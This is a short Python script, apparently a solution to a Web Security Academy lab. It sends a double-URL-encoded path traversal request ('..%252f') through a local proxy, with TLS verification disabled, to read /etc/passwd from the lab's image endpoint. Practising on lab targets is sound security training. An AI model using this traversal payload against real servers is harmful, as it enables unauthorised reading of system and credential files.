import requests

#to disable ceritifcate warning
requests.packages.urllib3.\
disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

proxies = {'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'}

url =  "https://0aca00620414299481118e5a00b20092.web-security-academy.net/image?filename=..%252f..%252f..%252fetc/passwd"
r = requests.get(url, verify=False, proxies=proxies)
print('body is ', r.text)